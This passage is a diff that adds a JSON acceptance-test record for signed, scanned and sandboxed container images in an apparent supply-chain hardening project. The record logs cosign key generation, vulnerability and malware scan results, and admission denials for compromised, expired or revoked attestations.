@@ -1,0 +1,3389 @@
+{
+  "base_image": "python:3.12-alpine@sha256:6d43704baacd1bfbe7c295d7f13079d5d8104ed33568873133f8fc69980419df",
+  "checks": {
+    "all_admission_denials_passed": true,
+    "all_container_containment_passed": true,
+    "all_image_signatures_verified": true,
+    "all_images_independently_comparable": true,
+    "all_malware_scans_passed": true,
+    "all_sboms_verified": true,
+    "all_vulnerability_scans_passed": true,
+    "bounded_service_health_deadline_recorded": true,
+    "harness_identity_recorded": true,
+    "private_key_leak_count_zero": true,
+    "public_verifier_passed": true,
+    "purpose_built_signer_workflow_passed": true,
+    "rootful_engine_truth_recorded": true,
+    "runtime_attack_matrix_passed": true,
+    "scanner_identities_recorded": true,
+    "sealed_twelve_image_manifest_verified": true,
+    "service_images_healthy": true,
+    "six_purpose_built_images": true,
+    "static_attack_matrix_passed": true
+  },
+  "cleanup": {
+    "containers_after": 22,
+    "containers_before": 22,
+    "ephemeral_private_files_removed": true,
+    "owned_container_count": 57,
+    "owned_container_ids": [
+      "8fc7037cd625df88ae4d62c25379ecbe9cec738bc6ae259589a220cdfb008963",
+      "32e61a82e281caf8bc0202571db7b6e23336ee0587fc853f5afd0fe7c9fd9a85",
+      "1719ff3ddcd96f3d3eb9c989b2a3debe651267eb61bcf590d4062071735ac130",
+      "8475b46bab586c82f401a6780a55faff5b62219c1011114ec7c213cf9876b9d3",
+      "4ec5cba34148dbac9a25c2c2f6894a7c46371321148ed84959c1022708d9a738",
+      "065002bda79ea5d5a7477b0a05c2646f9ba78af903a4dc728a108cbfdf31c2d6",
+      "19d44852bdb0d210836b5fea80fa4a54fec76f72a6ceb9e0f33db7ceb421fcb0",
+      "bbb1ca1baadc1b92d87eaa34af6c4dd4d2e70022e3dbbba15489225998865fa7",
+      "c4edd39dfa215afe4f13c254bd6dd2e6e4a1b1b388c7f80158a40ac332927f16",
+      "9b6d2a4982547fd519437fdadeeca72fd6179449382a8c78f41f6dc5749647f8",
+      "2bb41d0fa7fc563aafe0b051a944c1c89a82815a6b0089b6c40d1ba0edea9cee",
+      "8d4b44679a59cf1f12533d1292e7e0ceef45a2e31b344378f832d740aa68ab5e",
+      "07f4f6d6ac07496c3a165a428e4c91eed561c38713782a3ef96881bff5b293fe",
+      "debe277698d737a8cb50f4bbc0ac4fec19c17eb98b4956818293dd7bbb070607",
+      "c8c17474ed40b47535152b1cfa80db245cf5f8f9471620b0584864a79dfa69fd",
+      "606c8a4ef4e26f6af97d09e6d483afdba41ecf83553bc72d6e32aa9f5c5bafdc",
+      "18f900e59867b4033bf70e53592816bddc025cdae4f9f0545ad56ac5972006a5",
+      "4db6e9b37e62d74c6387202b6218c3632b429a6d263ca96235bd59ea99fb2dbe",
+      "efd6c91ef9ee42f8d4e67f82a2486800373d1b001ffd06f2b07bfe449d5d8d56",
+      "38e0407326dfcc95df75cbd4178a9083d4fd35bbc6faaab0ef7355729708d0ac",
+      "02d5bc5e93cf49df2b3872ac9f42cce5bbf5e76f24233865f053212bec5089bb",
+      "5b1cf940ada5517d0f7d2c7728dddb04256aea04b6b7133314ddd038e3de6123",
+      "59984c4b01bd3bb543ac3810bc02c6e85314054f3253dcc2146dac9c487428fe",
+      "36589ac32770031bc67d61ca52eae0d51d9c061aeb2552e618078b472f10decc",
+      "d0e0c5471af926133badcc0884bc67b309e78590c30b605339a9a5ae1a108aaa",
+      "931998fc3e7a541ed59e90f3fd750106c2bad7b388412656644fb1795ea43629",
+      "a9e6c4e42140f1763589f03efda2579386601bb37c2dd3f322c7215284e2ebdb",
+      "ffb08f70bff6d922b14861ed6d8970c009ff152afb09a84f6994210c72957c99",
+      "37b91751e739f4178ef45966fb1562e38098198e6c24d17ff1c3754ba03101e1",
+      "147b6fa54e4a8fff353dc413be6a088a6c480ae59f0bb439f3219f301fc1ef90",
+      "082ddac07c94f5cba4e91a8f8b40909bdc653dd3617f6bfc3e9967232060784a",
+      "7c027592eac7200f9cdb9b46c44033295ef21acf155bc5eae6768d844c4e468d",
+      "dd1c43df3655201bec5b001f398280ab3b6b71e0b70087df418d052ccebb2562",
+      "24272db8c0e1fe8f2e6001227e4a49c0c8e9da244e89578dd7e13540919f45a8",
+      "9d4c1472fb68b85e5431b05d2c28bcec88e2c1dc9c49f4acec80ad98be313cb9",
+      "392ea673986e0dabc5f78a55c0fa010e2109289fd089a9c19724cac8c29f437a",
+      "9b779d4fd4c56cd666049be1f6c1d8e03fa0bd87b7f5f602c7cd7fd769eab473",
+      "bee8978e19b2e1f1f583e9336456e5f09c0a250d50aa3626efe86cc0ffb6e351",
+      "f0518ed762edaeba397cd7f01dc5cf12295e8044a07837b16f147627890c2925",
+      "f041cdf5dd2a3344dfe64497eb740917d329cc81b905dc7ac0f6859e92ee31e0",
+      "02cf8eb911098b4980b3baeac406b541c000a33031bd401ea54ee727f6f457c3",
+      "dc58992abde0ead063b4231cbff717226a0ec3c986d304ee55b6cad8b14052aa",
+      "3c68aafda552c350c4e44a1ba31f1dc95d2e1f81ee92e5e0c4e8f6da9abe2d7f",
+      "c35ad1869294bcf4cc4f3c341a743b1d9773a87a64a4302a9cb13bbe116b195b",
+      "b9db454c2596b6048c27720f0d0fd98194dd9c42c5c0e8c8f8acacb99914064c",
+      "79c3c63a3160ba81c230170297134486745a99e2443198c559328436dd1ad3f7",
+      "cadebc086155a956b626988f642b6766e667440faa2413f182c196049842702f",
+      "33186a52af0a2fc1f2389e767878c47a5dc03a9ffdb9327eebd048909a1d3cc8",
+      "d768fe670cf7449ad2ecc776834e25aff4a858fb89b3b18c3757a61fb12e2d86",
+      "3d1706c23494e4ec6548e8c00eb5e5656c5c34b5dd4e992dbe1e856db063ffef",
+      "a4b75b2f091eba440e38e74910ca68528fea89117027c3069a43fae95715391b",
+      "f77c09a5f50f2c0ab921555fec0398c6f62c0377ea201afad0d11e99c40082ae",
+      "b486be206b1edf8b19a3427031251fb60caab948ca2212102938bc4f39142826",
+      "ec42cfa3ab8f38b72174eedab5a4090af20b8384ff2048a8f2265feb5bb9cfdf",
+      "d26a21a6694482d232ec9d4f27c6012a2a397ca8762bf33f752e79309e2c0753",
+      "bbe875502a5529ea21c860f2b12939205b234bb97feee2311c18b2e7ebbe237a",
+      "92c01288efde6576d7c50acc71a2531ed86915f5f70e1fa96549f13571b26b2f"
+    ],
+    "private_paths_detected": [],
+    "residual_private_paths": [],
+    "unrelated_container_ids_preserved": true
+  },
+  "completed_at_utc": "2026-07-18T07:07:30.764806Z",
+  "docker_engine": {
+    "daemon_mode": "rootful",
+    "rootless_claimed": false
+  },
+  "harness": {
+    "core_path": "/home/forge/grok-build-workspace-certforge/scripts/p4_hostile_acceptance.py",
+    "core_sha256": "58a953a25319facbc044f69a5556a43c1777618425216591a299b88804bfe7bf",
+    "exact_path": "/home/forge/grok-build-workspace-certforge/scripts/p4_hostile_acceptance_exact.py",
+    "exact_sha256": "a4a7e202987b55beae91179a7f9f655d273199653106d9cf61e31fad09a6d505",
+    "path": "/home/forge/grok-build-workspace-certforge/scripts/p4_hostile_acceptance_hardened.py",
+    "service_health_deadline_seconds": 30,
+    "sha256": "ad7cf439bdfc7a00efb4c23ea4c120b9807449bf773c6d3abfa0845e78b48fd4"
+  },
+  "image_signatures": {
+    "key_generation": {
+      "classification": "SUCCESS",
+      "command": [
+        "/home/forge/.cache/echo-certforge/p4-9c07eb7/tools/cosign/cosign",
+        "generate-key-pair",
+        "--output-key-prefix",
+        "/mnt/storage/forge_cache/echo-certforge/p4-8ccfa65/rerun6-runtime/image-signing"
+      ],
+      "completed_at_utc": "2026-07-18T07:05:57.793542Z",
+      "cosign_password_logged": false,
+      "cosign_password_present": true,
+      "elapsed_seconds": 0.388705,
+      "operation": "cosign_generate_key_pair",
+      "output_key_prefix": "/mnt/storage/forge_cache/echo-certforge/p4-8ccfa65/rerun6-runtime/image-signing",
+      "private_bytes": 653,
+      "private_exists": true,
+      "private_key_removed": true,
+      "process_id": 592292,
+      "public_bytes": 178,
+      "public_exists": true,
+      "public_key_retained": true,
+      "resources_after": {
+        "cosign": {
+          "path": "/mnt/storage/forge_cache/echo-certforge/p4-9c07eb7/tools/cosign/cosign",
+          "sha256": "ae1ecd212663f3693ad9edf8b1a183900c9a52d3155ba6e354237f9a0f6463fc",
+          "version_returncode": 0,
+          "version_stderr": "",
+          "version_stdout": "  ______   ______        _______. __    _______ .__   __.\n /      | /  __  \\      /       ||  |  /  _____||  \\ |  |\n|  ,----'|  |  |  |    |   (----`|  | |  |  __  |   \\|  |\n|  |     |  |  |  |     \\   \\    |  | |  | |_ | |  . `  |\n|  `----.|  `--'  | .----)   |   |  | |  |__| | |  |\\   |\n \\______| \\______/  |_______/    |__|  \\______| |__| \\__|\ncosign: A tool for Container Signing, Verification and Storage in an OCI registry.\n\nGitVersion:    v3.1.1\nGitCommit:     7914231b348c4057891edeb321772aad3ed04fce\nGitTreeState:  clean\nBuildDate:     2026-06-09T12:10:44Z\nGoVersion:     go1.26.3\nCompiler:      gc\nPlatform:      linux/amd64\n\n"
+        },
+        "disk_free_bytes": 52516519936,
+        "disk_total_bytes": 258604003328,
+        "disk_used_bytes": 206087483392,
+        "filesystem_path": "/mnt/storage/forge_cache/echo-certforge/p4-8ccfa65/rerun6-runtime",
+        "filesystem_resolved": "/mnt/storage/forge_cache/echo-certforge/p4-8ccfa65/rerun6-runtime",
+        "identity": {
+          "gid": 1002,
+          "pid": 485361,
+          "uid": 1000
+        },
+        "load_average": [
+          7.3671875,
+          7.8681640625,
+          12.4033203125
+        ],
+        "memory": {
+          "memavailable_kib": 17915356,
+          "memtotal_kib": 32629712,
+          "swapfree_kib": 670228,
+          "swaptotal_kib": 20971512
+        },
+        "mount": {
+          "available": true,
+          "returncode": 0,
+          "stderr": "",
+          "stdout": "{\n   \"filesystems\": [\n      {\n         \"target\": \"/mnt/storage\",\n         \"source\": \"/dev/nvme2n1p3\",\n         \"fstype\": \"fuseblk\",\n         \"options\": \"rw,relatime,user_id=0,group_id=0,default_permissions,allow_other,blksize=4096\"\n      }\n   ]\n}\n"
+        },
+        "working_directory": "/home/forge/grok-build-workspace-certforge"
+      },
+      "resources_before": {
+        "cosign": {
+          "path": "/mnt/storage/forge_cache/echo-certforge/p4-9c07eb7/tools/cosign/cosign",
+          "sha256": "ae1ecd212663f3693ad9edf8b1a183900c9a52d3155ba6e354237f9a0f6463fc",
+          "version_returncode": 0,
+          "version_stderr": "",
+          "version_stdout": "  ______   ______        _______. __    _______ .__   __.\n /      | /  __  \\      /       ||  |  /  _____||  \\ |  |\n|  ,----'|  |  |  |    |   (----`|  | |  |  __  |   \\|  |\n|  |     |  |  |  |     \\   \\    |  | |  | |_ | |  . `  |\n|  `----.|  `--'  | .----)   |   |  | |  |__| | |  |\\   |\n \\______| \\______/  |_______/    |__|  \\______| |__| \\__|\ncosign: A tool for Container Signing, Verification and Storage in an OCI registry.\n\nGitVersion:    v3.1.1\nGitCommit:     7914231b348c4057891edeb321772aad3ed04fce\nGitTreeState:  clean\nBuildDate:     2026-06-09T12:10:44Z\nGoVersion:     go1.26.3\nCompiler:      gc\nPlatform:      linux/amd64\n\n"
+        },
+        "disk_free_bytes": 52516528128,
+        "disk_total_bytes": 258604003328,
+        "disk_used_bytes": 206087475200,
+        "filesystem_path": "/mnt/storage/forge_cache/echo-certforge/p4-8ccfa65/rerun6-runtime",
+        "filesystem_resolved": "/mnt/storage/forge_cache/echo-certforge/p4-8ccfa65/rerun6-runtime",
+        "identity": {
+          "gid": 1002,
+          "pid": 485361,
+          "uid": 1000
+        },
+        "load_average": [
+          7.3671875,
+          7.8681640625,
+          12.4033203125
+        ],
+        "memory": {
+          "memavailable_kib": 18114616,
+          "memtotal_kib": 32629712,
+          "swapfree_kib": 692084,
+          "swaptotal_kib": 20971512
+        },
+        "mount": {
+          "available": true,
+          "returncode": 0,
+          "stderr": "",
+          "stdout": "{\n   \"filesystems\": [\n      {\n         \"target\": \"/mnt/storage\",\n         \"source\": \"/dev/nvme2n1p3\",\n         \"fstype\": \"fuseblk\",\n         \"options\": \"rw,relatime,user_id=0,group_id=0,default_permissions,allow_other,blksize=4096\"\n      }\n   ]\n}\n"
+        },
+        "working_directory": "/home/forge/grok-build-workspace-certforge"
+      },
+      "retry_count": 0,
+      "retry_reason": null,
+      "returncode": 0,
+      "schema_version": "1.0.0",
+      "started_at_utc": "2026-07-18T07:05:57.268220Z",
+      "stderr": "Private key written to /mnt/storage/forge_cache/echo-certforge/p4-8ccfa65/rerun6-runtime/image-signing.key\nPublic key written to /mnt/storage/forge_cache/echo-certforge/p4-8ccfa65/rerun6-runtime/image-signing.pub\n",
+      "stdout": "",
+      "timed_out": false,
+      "timeout_seconds": 60
+    },
+    "passed": true,
+    "private_key_removed": true,
+    "public_key": "/mnt/storage/forge_cache/echo-certforge/p4-8ccfa65/rerun6-runtime/image-signing.pub",
+    "public_key_sha256": "f89add47e11537d2b519c27179b628d84af662063accbb5d46ed1512a9a0827f",
+    "signatures": {
+      "anchor": {
+        "bundle": "/mnt/storage/forge_cache/echo-certforge/p4-8ccfa65/rerun6-runtime/anchor.cosign.bundle",
+        "bundle_sha256": "348cf14c57f3cbd5b1e9990c09e0972e8e2d8ec52fdeeec9ce15fa8616387b3a",
+        "verification_stderr": "WARNING: Skipping tlog verification is an insecure practice that lacks transparency and auditability verification for the blob.\nVerified OK\n",
+        "verified": true
+      },
+      "custody": {
+        "bundle": "/mnt/storage/forge_cache/echo-certforge/p4-8ccfa65/rerun6-runtime/custody.cosign.bundle",
+        "bundle_sha256": "62a8a68d9d2a4baf07071face5d0ac888c464a6eff969c0605df23a7379cf8d2",
+        "verification_stderr": "WARNING: Skipping tlog verification is an insecure practice that lacks transparency and auditability verification for the blob.\nVerified OK\n",
+        "verified": true
+      },
+      "runner": {
+        "bundle": "/mnt/storage/forge_cache/echo-certforge/p4-8ccfa65/rerun6-runtime/runner.cosign.bundle",
+        "bundle_sha256": "7db7065710c65494e876f13fc82c8d837b0b7786e7e23b418c6a76eca7110caa",
+        "verification_stderr": "WARNING: Skipping tlog verification is an insecure practice that lacks transparency and auditability verification for the blob.\nVerified OK\n",
+        "verified": true
+      },
+      "signer": {
+        "bundle": "/mnt/storage/forge_cache/echo-certforge/p4-8ccfa65/rerun6-runtime/signer.cosign.bundle",
+        "bundle_sha256": "e390aa7bee23cf1572769cb278f76e12f6e8ea8f964a61ece91f3bb6f7f406a7",
+        "verification_stderr": "WARNING: Skipping tlog verification is an insecure practice that lacks transparency and auditability verification for the blob.\nVerified OK\n",
+        "verified": true
+      },
+      "verifier": {
+        "bundle": "/mnt/storage/forge_cache/echo-certforge/p4-8ccfa65/rerun6-runtime/verifier.cosign.bundle",
+        "bundle_sha256": "ac7155de294be27bc6b8c2ef2b8858d31cc2441088a8aeab1d87537e297a2bc5",
+        "verification_stderr": "WARNING: Skipping tlog verification is an insecure practice that lacks transparency and auditability verification for the blob.\nVerified OK\n",
+        "verified": true
+      },
+      "worker": {
+        "bundle": "/mnt/storage/forge_cache/echo-certforge/p4-8ccfa65/rerun6-runtime/worker.cosign.bundle",
+        "bundle_sha256": "2be95add8b8e9805f835caed190d9c45e4dd62911889c29b73668717b148753e",
+        "verification_stderr": "WARNING: Skipping tlog verification is an insecure practice that lacks transparency and auditability verification for the blob.\nVerified OK\n",
+        "verified": true
+      }
+    }
+  },
+  "images": {
+    "anchor": {
+      "admission": {
+        "allowed": true,
+        "attestation_key_id": "ed25519:d1a2b83569e5a4d3d33025410088a5fe",
+        "image_digest": "sha256:54a86fa4dc7b7bbf2a18ed2a53b41577805efa057640936331294bfad1405463",
+        "reasons": [],
+        "role": "anchor"
+      },
+      "attestation": {
+        "key_id": "ed25519:d1a2b83569e5a4d3d33025410088a5fe",
+        "path": "/mnt/storage/forge_cache/echo-certforge/p4-8ccfa65/sealed/records/anchor/a/anchor-a.attestation.json",
+        "private_key_persisted": false,
+        "sha256": "ffb3ebca6d86471ddb9180ec49fc43e8a38c149a3671fedcb8fb16cb99cd3837"
+      },
+      "comparison_image_digest": "sha256:f0c559f0d754f05c76f8153af64c4d81c8b5c357e75fb3879c482db8f3108a03",
+      "comparison_reference": "echo-certforge-anchor:p4-8ccfa65-b",
+      "compromised_admission": {
+        "allowed": false,
+        "attestation_key_id": "ed25519:d1a2b83569e5a4d3d33025410088a5fe",
+        "image_digest": "sha256:54a86fa4dc7b7bbf2a18ed2a53b41577805efa057640936331294bfad1405463",
+        "reasons": [
+          "attestation_key_compromised"
+        ],
+        "role": "anchor"
+      },
+      "containment": {
+        "all_capabilities_dropped": true,
+        "apparmor": true,
+        "cpu_limited": true,
+        "docker_socket_absent": true,
+        "memory_limited": true,
+        "network_none": true,
+        "no_new_privileges": true,
+        "pids_limited": true,
+        "read_only_root": true
+      },
+      "dockerfile_sha256": "4ae2d6a5af5732fac4902d0cac0ba41325db9b1a8ff4735a9b9d7ee152761f86",
+      "drifted_admission": {
+        "allowed": false,
+        "attestation_key_id": "ed25519:d1a2b83569e5a4d3d33025410088a5fe",
+        "image_digest": "sha256:54a86fa4dc7b7bbf2a18ed2a53b41577805efa057640936331294bfad1405463",
+        "reasons": [
+          "image_digest_drift"
+        ],
+        "role": "anchor"
+      },
+      "exact_digest_reproducible": false,
+      "expired_admission": {
+        "allowed": false,
+        "attestation_key_id": "ed25519:d1a2b83569e5a4d3d33025410088a5fe",
+        "image_digest": "sha256:54a86fa4dc7b7bbf2a18ed2a53b41577805efa057640936331294bfad1405463",
+        "reasons": [
+          "image_attestation_expired"
+        ],
+        "role": "anchor"
+      },
+      "filesystem_scan": {
+        "file_count": 4595,
+        "findings": [],
+        "passed": true,
+        "tar_path": "/mnt/storage/forge_cache/echo-certforge/p4-8ccfa65/rerun6-runtime/anchor.rootfs.tar",
+        "tar_sha256": "62e4f31f15da0f6ba1ce71aecca66a15d3d678c7236bed786c856d29f2f96f03"
+      },
+      "image_digest": "sha256:54a86fa4dc7b7bbf2a18ed2a53b41577805efa057640936331294bfad1405463",
+      "independently_comparable": true,
+      "lockfile_sha256": "4bfd5e749f079f1fffc35463ddd03a95e564e416b4e80d97a666e87286e016aa",
+      "malware_scan": {
+        "database_missing": false,
+        "exit_code": 0,
+        "logs_sha256": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
+        "passed": true,
+        "scanner_image": "clamav/clamav@sha256:7f5389ccaa2368c383fa80e167ccfe44348d71e685f926fce4755eed1757673a"
+      },
+      "normalized_manifest": {
+        "architecture": "x86_64",
+        "packages": [
+          {
+            "name": "annotated-doc",
+            "version": "0.0.4"
+          },
+          {
+            "name": "annotated-types",
+            "version": "0.7.0"
+          },
+          {
+            "name": "anyio",
+            "version": "4.14.2"
+          },
+          {
+            "name": "cffi",
+            "version": "2.1.0"
+          },
+          {
+            "name": "click",
+            "version": "8.4.2"
+          },
+          {
+            "name": "colorama",
+            "version": "0.4.6"
+          },
+          {
+            "name": "cryptography",
+            "version": "49.0.0"
+          },
+          {
+            "name": "fastapi",
+            "version": "0.139.0"
+          },
+          {
+            "name": "h11",
+            "version": "0.16.0"
+          },
+          {
+            "name": "idna",
+            "version": "3.18"
+          },
+          {
+            "name": "pip",
+            "version": "25.0.1"
+          },
+          {
+            "name": "pycparser",
+            "version": "3.0"
+          },
+          {
+            "name": "pydantic",
+            "version": "2.13.4"
+          },
+          {
+            "name": "pydantic_core",
+            "version": "2.46.4"
+          },
+          {
+            "name": "starlette",
+            "version": "1.3.1"
+          },
+          {
+            "name": "typing-inspection",
+            "version": "0.4.2"
+          },
+          {
+            "name": "typing_extensions",
+            "version": "4.16.0"
+          },
+          {
+            "name": "uvicorn",
+            "version": "0.51.0"
+          }
+        ],
+        "python": "3.12.13",
+        "source_file_count": 24,
+        "source_manifest_sha256": "5d67613c63f6f5b9393f51c664f1194c8f963d920871a72679dc3adc9da52018"
+      },
+      "primary_reference": "echo-certforge-anchor:p4-8ccfa65-a",
+      "provenance": {
+        "path": "/mnt/storage/forge_cache/echo-certforge/p4-8ccfa65/sealed/records/anchor/a/anchor-a.provenance.json",
+        "sha256": "02695d5727628b937de8b793dbf40d088a5a3e7903bb246cf465eaf96ca59977"
+      },
+      "revoked_admission": {
+        "allowed": false,
+        "attestation_key_id": "ed25519:d1a2b83569e5a4d3d33025410088a5fe",
+        "image_digest": "sha256:54a86fa4dc7b7bbf2a18ed2a53b41577805efa057640936331294bfad1405463",
+        "reasons": [
+          "image_digest_revoked"
+        ],
+        "role": "anchor"
+      },
+      "sbom": {
+        "path": "/mnt/storage/forge_cache/echo-certforge/p4-8ccfa65/sealed/records/anchor/a/anchor-a.spdx.json",
+        "sha256": "40c1637a59877ffbe97a5b3cc3dc433a1d42a48be88d7a330b47ddc48193bd9b",
+        "verified": true
+      },
+      "unknown_key_admission": {
+        "allowed": false,
+        "attestation_key_id": "ed25519:d1a2b83569e5a4d3d33025410088a5fe",
+        "image_digest": "sha256:54a86fa4dc7b7bbf2a18ed2a53b41577805efa057640936331294bfad1405463",
+        "reasons": [
+          "unknown_attestation_key"
+        ],
+        "role": "anchor"
+      },
+      "vulnerability_scan": {
+        "blocking_vulnerabilities": [],
+        "critical_count": 0,
+        "fixed_high_or_critical_count": 0,
+        "passed": true,
+        "path": "/mnt/storage/forge_cache/echo-certforge/p4-8ccfa65/rerun6-runtime/anchor.trivy.json",
+        "secret_finding_count": 0,
+        "sha256": "2b1a06102b19c34e82147c22a288d5a7a7e538d86eb372891643c923cff5c6eb",
+        "tool_returncode": 0,
+        "vulnerability_count": 5
+      }
+    },
+    "custody": {
+      "admission": {
+        "allowed": true,
+        "attestation_key_id": "ed25519:d1a2b83569e5a4d3d33025410088a5fe",
+        "image_digest": "sha256:63fde0a4862086b7040cf0c751d20a9aa7159fa2052202d4c3e142b8b855a921",
+        "reasons": [],
+        "role": "custody"
+      },
+      "attestation": {
+        "key_id": "ed25519:d1a2b83569e5a4d3d33025410088a5fe",
+        "path": "/mnt/storage/forge_cache/echo-certforge/p4-8ccfa65/sealed/records/custody/a/custody-a.attestation.json",
+        "private_key_persisted": false,
+        "sha256": "5680ae4e0117a9d90757d60196eb54008696bbf5e68e54b2b1e136a3bcaaaada"
+      },
+      "comparison_image_digest": "sha256:cd8df2e1159641b4794261539c8168e8af77aee2505566d62b59e1abe51d7889",
+      "comparison_reference": "echo-certforge-custody:p4-8ccfa65-b",
+      "compromised_admission": {
+        "allowed": false,
+        "attestation_key_id": "ed25519:d1a2b83569e5a4d3d33025410088a5fe",
+        "image_digest": "sha256:63fde0a4862086b7040cf0c751d20a9aa7159fa2052202d4c3e142b8b855a921",
+        "reasons": [
+          "attestation_key_compromised"
+        ],
+        "role": "custody"
+      },
+      "containment": {
+        "all_capabilities_dropped": true,
+        "apparmor": true,
+        "cpu_limited": true,
+        "docker_socket_absent": true,
+        "memory_limited": true,
+        "network_none": true,
+        "no_new_privileges": true,
+        "pids_limited": true,
+        "read_only_root": true
+      },
+      "dockerfile_sha256": "8bf27b0262a87775a481adbfa84b4741f6794f8cec4a47d300174ab5dbfd8105",
+      "drifted_admission": {
+        "allowed": false,
+        "attestation_key_id": "ed25519:d1a2b83569e5a4d3d33025410088a5fe",
+        "image_digest": "sha256:63fde0a4862086b7040cf0c751d20a9aa7159fa2052202d4c3e142b8b855a921",
+        "reasons": [
+          "image_digest_drift"
+        ],
+        "role": "custody"
+      },
+      "exact_digest_reproducible": false,
+      "expired_admission": {
+        "allowed": false,
+        "attestation_key_id": "ed25519:d1a2b83569e5a4d3d33025410088a5fe",
+        "image_digest": "sha256:63fde0a4862086b7040cf0c751d20a9aa7159fa2052202d4c3e142b8b855a921",
+        "reasons": [
+          "image_attestation_expired"
+        ],
+        "role": "custody"
+      },
+      "filesystem_scan": {
+        "file_count": 4595,
+        "findings": [],
+        "passed": true,
+        "tar_path": "/mnt/storage/forge_cache/echo-certforge/p4-8ccfa65/rerun6-runtime/custody.rootfs.tar",
+        "tar_sha256": "4ffa3e5e7b8c88d36f80a4668d93a3434ef7023ae110723cd0b893e7c13b402b"
+      },
+      "image_digest": "sha256:63fde0a4862086b7040cf0c751d20a9aa7159fa2052202d4c3e142b8b855a921",
+      "independently_comparable": true,
+      "lockfile_sha256": "4bfd5e749f079f1fffc35463ddd03a95e564e416b4e80d97a666e87286e016aa",
+      "malware_scan": {
+        "database_missing": false,
+        "exit_code": 0,
+        "logs_sha256": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
+        "passed": true,
+        "scanner_image": "clamav/clamav@sha256:7f5389ccaa2368c383fa80e167ccfe44348d71e685f926fce4755eed1757673a"
+      },
+      "normalized_manifest": {
+        "architecture": "x86_64",
+        "packages": [
+          {
+            "name": "annotated-doc",
+            "version": "0.0.4"
+          },
+          {
+            "name": "annotated-types",
+            "version": "0.7.0"
+          },
+          {
+            "name": "anyio",
+            "version": "4.14.2"
+          },
+          {
+            "name": "cffi",
+            "version": "2.1.0"
+          },
+          {
+            "name": "click",
+            "version": "8.4.2"
+          },
+          {
+            "name": "colorama",
+            "version": "0.4.6"
+          },
+          {
+            "name": "cryptography",
+            "version": "49.0.0"
+          },
+          {
+            "name": "fastapi",
+            "version": "0.139.0"
+          },
+          {
+            "name": "h11",
+            "version": "0.16.0"
+          },
+          {
+            "name": "idna",
+            "version": "3.18"
+          },
+          {
+            "name": "pip",
+            "version": "25.0.1"
+          },
+          {
+            "name": "pycparser",
+            "version": "3.0"
+          },
+          {
+            "name": "pydantic",
+            "version": "2.13.4"
+          },
+          {
+            "name": "pydantic_core",
+            "version": "2.46.4"
+          },
+          {
+            "name": "starlette",
+            "version": "1.3.1"
+          },
+          {
+            "name": "typing-inspection",
+            "version": "0.4.2"
+          },
+          {
+            "name": "typing_extensions",
+            "version": "4.16.0"
+          },
+          {
+            "name": "uvicorn",
+            "version": "0.51.0"
+          }
+        ],
+        "python": "3.12.13",
+        "source_file_count": 24,
+        "source_manifest_sha256": "5d67613c63f6f5b9393f51c664f1194c8f963d920871a72679dc3adc9da52018"
+      },
+      "primary_reference": "echo-certforge-custody:p4-8ccfa65-a",
+      "provenance": {
+        "path": "/mnt/storage/forge_cache/echo-certforge/p4-8ccfa65/sealed/records/custody/a/custody-a.provenance.json",
+        "sha256": "a8b7ceadd9c308673ff2b62e143897b6d6f76b9253fd0a784809772a3ca669a4"
+      },
+      "revoked_admission": {
+        "allowed": false,
+        "attestation_key_id": "ed25519:d1a2b83569e5a4d3d33025410088a5fe",
+        "image_digest": "sha256:63fde0a4862086b7040cf0c751d20a9aa7159fa2052202d4c3e142b8b855a921",
+        "reasons": [
+          "image_digest_revoked"
+        ],
+        "role": "custody"
+      },
+      "sbom": {
+        "path": "/mnt/storage/forge_cache/echo-certforge/p4-8ccfa65/sealed/records/custody/a/custody-a.spdx.json",
+        "sha256": "390249c9594c6e673f66df3e6f4983a71fde889dbe9a39120af33c9f18fbf43b",
+        "verified": true
+      },
+      "unknown_key_admission": {
+        "allowed": false,
+        "attestation_key_id": "ed25519:d1a2b83569e5a4d3d33025410088a5fe",
+        "image_digest": "sha256:63fde0a4862086b7040cf0c751d20a9aa7159fa2052202d4c3e142b8b855a921",
+        "reasons": [
+          "unknown_attestation_key"
+        ],
+        "role": "custody"
+      },
+      "vulnerability_scan": {
+        "blocking_vulnerabilities": [],
+        "critical_count": 0,
+        "fixed_high_or_critical_count": 0,
+        "passed": true,
+        "path": "/mnt/storage/forge_cache/echo-certforge/p4-8ccfa65/rerun6-runtime/custody.trivy.json",
+        "secret_finding_count": 0,
+        "sha256": "c56189202a0dc690233e6993ba2eed9e5f2066b665857a9279204b5382eccbe8",
+        "tool_returncode": 0,
+        "vulnerability_count": 5
+      }
+    },
+    "runner": {
+      "admission": {
+        "allowed": true,
+        "attestation_key_id": "ed25519:d1a2b83569e5a4d3d33025410088a5fe",
+        "image_digest": "sha256:33a049deab08995c47c9b1b4e76e2ab5e6ad741aee1df7f0b2f4f12701dd3c65",
+        "reasons": [],
+        "role": "runner"
+      },
+      "attestation": {
+        "key_id": "ed25519:d1a2b83569e5a4d3d33025410088a5fe",
+        "path": "/mnt/storage/forge_cache/echo-certforge/p4-8ccfa65/sealed/records/runner/a/runner-a.attestation.json",
+        "private_key_persisted": false,
+        "sha256": "9da27435601bdff09815c6ac9da140e27509ae8a5b3021dc19087bca38bbe5ae"
+      },
+      "comparison_image_digest": "sha256:a67952c91aeb2379d6d5a755ae38bee9f2c01294ea9b90856a78d8358eb9510c",
+      "comparison_reference": "echo-certforge-runner:p4-8ccfa65-b",
+      "compromised_admission": {
+        "allowed": false,
+        "attestation_key_id": "ed25519:d1a2b83569e5a4d3d33025410088a5fe",
+        "image_digest": "sha256:33a049deab08995c47c9b1b4e76e2ab5e6ad741aee1df7f0b2f4f12701dd3c65",
+        "reasons": [
+          "attestation_key_compromised"
+        ],
+        "role": "runner"
+      },
+      "containment": {
+        "all_capabilities_dropped": true,
+        "apparmor": true,
+        "cpu_limited": true,
+        "docker_socket_absent": true,
+        "memory_limited": true,
+        "network_none": true,
+        "no_new_privileges": true,
+        "pids_limited": true,
+        "read_only_root": true
+      },
+      "dockerfile_sha256": "e28b1c9bc05ef8f2b8d2f95e769162a06a8feafc2e9e3396af7523daf939de25",
+      "drifted_admission": {
+        "allowed": false,
+        "attestation_key_id": "ed25519:d1a2b83569e5a4d3d33025410088a5fe",
+        "image_digest": "sha256:33a049deab08995c47c9b1b4e76e2ab5e6ad741aee1df7f0b2f4f12701dd3c65",
+        "reasons": [
+          "image_digest_drift"
+        ],
+        "role": "runner"
+      },
+      "exact_digest_reproducible": false,
+      "expired_admission": {
+        "allowed": false,
+        "attestation_key_id": "ed25519:d1a2b83569e5a4d3d33025410088a5fe",
